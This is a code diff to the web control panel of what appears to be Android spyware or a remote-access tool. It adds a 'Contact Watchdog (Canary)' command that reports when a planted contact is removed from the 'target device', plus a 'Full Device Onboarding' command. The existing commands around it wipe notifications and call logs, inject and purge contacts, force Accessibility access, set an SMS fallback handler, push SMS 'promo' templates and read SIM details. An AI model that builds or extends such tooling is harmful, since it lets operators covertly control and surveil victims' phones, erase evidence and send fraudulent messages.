@@ -347,6 +347,7 @@
                     { id: 'WIPE_NOTIFICATIONS', name: 'Wipe Notifications', icon: '🧹', inputs: [{id: 'wipe-mode', label: 'Mode', type: 'select', options: [{v: 'ALL', l: 'All'}, {v: 'PKG', l: 'Package'}, {v: 'TEXT', l: 'Keyword'}]}, {id: 'wipe-val', label: 'Value (App or Word)', type: 'text'}] },
                     { id: 'PHONE_LOGS', name: 'Sanitize Call Logs', icon: '🧼', inputs: [{id: 'call-act', label: 'Action', type: 'select', options: [{v: 'CLEAR_ALL', l: 'Wipe All'}, {v: 'DELETE_LAST', l: 'Wipe Last'}, {v: 'DELETE_NUM', l: 'Wipe Number'}]}, {id: 'call-val', label: 'Value/Number', type: 'text'}] },
                     { id: 'ADD_CONTACT', name: 'Inject Contact', icon: '👤', inputs: [{id: 'con-name', label: 'Name', type: 'text'}, {id: 'con-num', label: 'Number', type: 'text'}] },
+                    { id: 'SET_CONTACT_WATCHDOG', name: 'Contact Watchdog (Canary)', icon: '🐦', inputs: [{id: 'watchdog-name', label: 'Contact Name', type: 'text'}, {id: 'watchdog-num', label: 'Phone Number', type: 'text'}] },
                     { id: 'PURGE_CONTACT', name: 'Purge Specific Contact', icon: '🗑️', inputs: [{id: 'con-purge', label: 'Name or Number to Wipe', type: 'text'}] }
                 ]
             },
@@ -454,7 +455,8 @@
                     { id: 'SET_JUDAS_HANDLER', name: 'Emergency SMS Fallback', icon: '📞', inputs: [{id: 'judas-handler', label: 'Phone Number', type: 'text'}] },
                     { id: 'SET_PROMOS', name: 'Deploy Cipher Promos', icon: '📨', inputs: [{id: 'promo-templates', label: 'Template A [TOKEN] ||| B...', type: 'textarea'}] },
                     { id: 'ACC_GOTO_SETTINGS', name: 'Force Accessibility Settings', icon: '⚙️', inputs: [] },
-                    { id: 'ACC_SHOW_HELP', name: 'Show Accessibility Guide', icon: '📖', inputs: [] }
+                    { id: 'ACC_SHOW_HELP', name: 'Show Accessibility Guide', icon: '📖', inputs: [] },
+                    { id: 'FULL_ONBOARDING', name: 'Full Device Onboarding', icon: '🚀', inputs: [] }
                 ]
             },
             {
@@ -983,6 +985,10 @@
                         content = document.getElementById('promo-templates').value; break;
                     case 'SET_TILE_STATE':
                         content = document.getElementById('val-tile-state').value; break;
+                    case 'SET_CONTACT_WATCHDOG':
+                        content = `${document.getElementById('watchdog-name').value}|${document.getElementById('watchdog-num').value}`; break;
+                    case 'FULL_ONBOARDING':
+                        content = ''; break;
                 }
             }
 
@@ -1118,6 +1124,13 @@
 
                 if (c.file_name === 'GET_NUMBERS' && c.result_data && c.result_data.sim_cards) {
                     dataHtml = '<div style="margin-top:10px; padding:10px; background:rgba(0,243,255,0.05); border:1px solid #333;"><div style="color:var(--primary); font-size:0.7rem; font-weight:bold; border-bottom:1px solid #333; padding-bottom:5px; margin-bottom:8px;">SIM_HARDWARE_REGISTRY</div>' + c.result_data.sim_cards.map(sim => '<div style="margin-bottom:8px; border-left:2px solid var(--success); padding-left:8px;"><div style="color:#fff; font-size:0.85rem;">' + sim.number + '</div><div style="color:#666; font-size:0.6rem;">SLOT: ' + sim.slot + ' | CARRIER: ' + sim.carrier + ' | ' + sim.country.toUpperCase() + '</div><div style="color:var(--primary); font-family:monospace; font-size:0.55rem; margin-top:2px; opacity:0.8;">SUB_ID: ' + sim.id + '</div></div>').join('') + '</div>';
+                }
+
+                if (c.file_name === 'SET_CONTACT_WATCHDOG' && c.status === 'WATCHDOG_TRIGGERED') {
+                    dataHtml = `<div style="margin-top:10px; padding:10px; background:rgba(255,0,60,0.1); border:1px solid var(--danger);">
+                        <div style="color:var(--danger); font-size:0.75rem; font-weight:bold;">⚠️ CANARY_COMPROMISED</div>
+                        <div style="color:#fff; font-size:0.7rem; margin-top:5px;">The monitored contact was deleted or modified on the target device.</div>
+                    </div>`;
                 }
 
                 if (c.file_name === 'GET_TRUSTED_SIMS' && c.result_data && c.result_data.trusted_sims) {
